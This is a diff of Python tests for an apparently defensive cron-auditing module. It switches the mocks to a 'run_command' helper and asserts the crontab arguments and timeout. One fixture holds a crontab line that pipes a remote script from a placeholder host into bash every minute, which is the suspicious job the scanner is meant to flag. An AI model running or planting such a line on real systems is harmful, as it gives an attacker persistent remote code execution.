@@ -158,12 +158,6 @@ echo hello
 
 def test_user_crontab_detects_suspicious_job(monkeypatch):
     monkeypatch.setattr(
-        cron,
-        "resolve_command",
-        lambda command: "/usr/bin/crontab",
-    )
-
-    monkeypatch.setattr(
         cron.pwd,
         "getpwall",
         lambda: [
@@ -174,15 +168,25 @@ def test_user_crontab_detects_suspicious_job(monkeypatch):
         ],
     )
 
-    result = SimpleNamespace(
-        returncode=0,
-        stdout="* * * * * curl http://example.com/p.sh | bash\n",
-    )
+    def fake_run(command, **kwargs):
+        assert command == [
+            "crontab",
+            "-l",
+            "-u",
+            "alice",
+        ]
+        assert kwargs["timeout"] == 5
+
+        return SimpleNamespace(
+            returncode=0,
+            stdout="* * * * * curl http://example.com/p.sh | bash\n",
+            stderr="",
+        )
 
     monkeypatch.setattr(
-        cron.subprocess,
-        "run",
-        lambda *args, **kwargs: result,
+        cron,
+        "run_command",
+        fake_run,
     )
 
     findings = cron.check_user_crontabs()
@@ -194,12 +198,6 @@ def test_user_crontab_detects_suspicious_job(monkeypatch):
 
 
 def test_user_crontab_skips_system_users(monkeypatch):
-    monkeypatch.setattr(
-        cron,
-        "resolve_command",
-        lambda command: "/usr/bin/crontab",
-    )
-
     monkeypatch.setattr(
         cron.pwd,
         "getpwall",
@@ -213,16 +211,17 @@ def test_user_crontab_skips_system_users(monkeypatch):
 
     calls = []
 
-    def fake_run(*args, **kwargs):
-        calls.append(args)
+    def fake_run(command, **kwargs):
+        calls.append((command, kwargs))
         return SimpleNamespace(
             returncode=0,
             stdout="",
+            stderr="",
         )
 
     monkeypatch.setattr(
-        cron.subprocess,
-        "run",
+        cron,
+        "run_command",
         fake_run,
     )
 
